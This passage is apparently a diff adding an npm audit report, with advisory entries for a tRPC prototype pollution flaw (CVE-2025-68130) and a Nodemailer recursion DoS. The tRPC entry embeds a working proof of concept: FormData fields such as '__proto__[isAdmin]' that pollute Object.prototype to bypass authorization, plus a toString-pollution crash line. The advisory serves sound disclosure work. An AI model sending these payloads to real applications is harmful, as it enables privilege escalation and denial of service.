+      "overview": "> Note that this vulnerability is only present when using `experimental_caller` / `experimental_nextAppDirCaller`.\n\n## Summary\n\nA Prototype Pollution vulnerability exists in `@trpc/server`'s `formDataToObject` function, which is used by the Next.js App Router adapter. An attacker can pollute `Object.prototype` by submitting specially crafted FormData field names, potentially leading to authorization bypass, denial of service, or other security impacts.\n\n## Affected Versions\n\n- **Package:** `@trpc/server`\n- **Affected Versions:** >=10.27.0\n- **Vulnerable Component:** `formDataToObject()` in `src/unstable-core-do-not-import/http/formDataToObject.ts`\n\n## Vulnerability Details\n\n### Root Cause\n\nThe `set()` function in `formDataToObject.ts` recursively processes FormData field names containing bracket/dot notation (e.g., `user[name]`, `user.address.city`) to create nested objects. However, it does **not** validate or sanitize dangerous keys like `__proto__`, `constructor`, or `prototype`.\n\n### Vulnerable Code\n\n```typescript\n// packages/server/src/unstable-core-do-not-import/http/formDataToObject.ts\nfunction set(obj, path, value) {\n  if (path.length > 1) {\n    const newPath = [...path];\n    const key = newPath.shift();  // ← No validation of dangerous keys\n    const nextKey = newPath[0];\n\n    if (!obj[key]) {  // ← Accesses obj[\"__proto__\"] which returns Object.prototype\n      obj[key] = isNumberString(nextKey) ? [] : {};\n    }\n    \n    set(obj[key], newPath, value);  // ← Recursively pollutes Object.prototype\n    return;\n  }\n  // ...\n}\n\nexport function formDataToObject(formData) {\n  const obj = {};\n  for (const [key, value] of formData.entries()) {\n    const parts = key.split(/[\\.\\[\\]]/).filter(Boolean);  // Splits \"__proto__[isAdmin]\" → [\"__proto__\", \"isAdmin\"]\n    set(obj, parts, value);\n  }\n  return obj;\n}\n```\n\n### Attack Vector\n\nWhen a user submits a form to a tRPC mutation using Next.js Server Actions, the `nextAppDirCaller` adapter processes the FormData:\n\n```typescript\n// packages/server/src/adapters/next-app-dir/nextAppDirCaller.ts:88-89\nif (normalizeFormData && input instanceof FormData) {\n  input = formDataToObject(input);  // ← Vulnerable call\n}\n```\n\nAn attacker can craft FormData with malicious field names:\n\n```javascript\nconst formData = new FormData();\nformData.append(\"__proto__[isAdmin]\", \"true\");\nformData.append(\"__proto__[role]\", \"superadmin\");\n```\n\nWhen processed, this pollutes `Object.prototype`:\n\n```javascript\n{}.isAdmin        // → \"true\"\n{}.role           // → \"superadmin\"\n```\n\n## Proof of Concept\n\n```bash\n# Step 1: Create the project directory\n\nmkdir trpc-vuln-poc\ncd trpc-vuln-poc\n\n# Step 2: Initialize npm\n\nnpm init -y\n\n# Step 3: Install vulnerable tRPC\n\nnpm install @trpc/server@11.7.2\n\n# Step 4: Create the test file \n```\n---\n\n### Test.js\n\n```javascript\nconst { formDataToObject } = require('@trpc/server/unstable-core-do-not-import');\n\nconsole.log(\"=== PoC Prototype Pollution en tRPC ===\\n\");\n\nconsole.log(\"[1] Estado inicial:\");\nconsole.log(\"    {}.isAdmin =\", {}.isAdmin);\n\nconst fd = new FormData();\nfd.append(\"__proto__[isAdmin]\", \"true\");\nfd.append(\"__proto__[role]\", \"superadmin\");\nfd.append(\"username\", \"attacker\");\n\nconsole.log(\"\\n[2] FormData malicioso:\");\nconsole.log('    __proto__[isAdmin] = \"true\"');\nconsole.log('    __proto__[role] = \"superadmin\"');\n\nconsole.log(\"\\n[3] Llamando formDataToObject()...\");\nconst result = formDataToObject(fd);\nconsole.log(\"    Resultado:\", JSON.stringify(result));\n\nconsole.log(\"\\n[4] Después del ataque:\");\nconsole.log(\"    {}.isAdmin =\", {}.isAdmin);\nconsole.log(\"    {}.role =\", {}.role);\n\nconst user = { id: 1, name: \"john\" };\nconsole.log(\"\\n[5] Impacto en autorización:\");\nconsole.log(\"    Usuario normal:\", JSON.stringify(user));\nconsole.log(\"    user.isAdmin =\", user.isAdmin);\n\nif (user.isAdmin) {\n    console.log(\"\\n    VULNERABLE - Authorization bypass exitoso!\");\n} else {\n    console.log(\"\\n    ✓ Seguro\");\n}\n```\n\n## Impact\n\n### Authorization Bypass (HIGH)\n\nMany applications check user permissions using property access:\n\n```javascript\n// Vulnerable pattern\nif (user.isAdmin) {\n  // Grant admin access\n}\n```\n\nAfter pollution, **all objects** will have `isAdmin: \"true\"`, bypassing authorization.\n\n### Denial of Service (MEDIUM)\n\nPolluting commonly used property names can crash applications:\n\n```javascript\nformData.append(\"__proto__[toString]\", \"not_a_function\");\n// All subsequent .toString() calls will fail\n```",
+      "reported_by": null,
+      "title": "tRPC has possible prototype pollution in `experimental_nextAppDirCaller`",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68130"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "@trpc/server",
+      "vulnerable_versions": ">=11.0.0 <11.8.0",
+      "github_advisory_id": "GHSA-43p4-m455-4f4j",
+      "recommendation": "Upgrade to version 11.8.0 or later",
+      "patched_versions": ">=11.8.0",
+      "updated": "2025-12-16T19:37:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-43p4-m455-4f4j"
+    },
+    "1111548": {
+      "findings": [
+        {
+          "version": "7.0.10",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-14874\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://access.redhat.com/security/cve/CVE-2025-14874\n- https://bugzilla.redhat.com/show_bug.cgi?id=2418133\n- https://github.com/nodemailer/nodemailer\n- https://github.com/advisories/GHSA-46j5-6fg5-4gv3",
+      "created": "2025-12-18T09:30:30.000Z",
+      "id": 1111548,
+      "npm_advisory_id": null,
+      "overview": "A flaw was found in Nodemailer. This vulnerability allows a denial of service (DoS) via a crafted email address header that triggers infinite recursion in the address parser.",
+      "reported_by": null,
+      "title": "Nodemailer is vulnerable to DoS through Uncontrolled Recursion",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14874"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.11",
+      "github_advisory_id": "GHSA-46j5-6fg5-4gv3",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-18T22:43:41.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-674",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-46j5-6fg5-4gv3"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 9,
+      "high": 3,
+      "critical": 0
+    },
+    "dependencies": 1443,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1443
+  }
+}
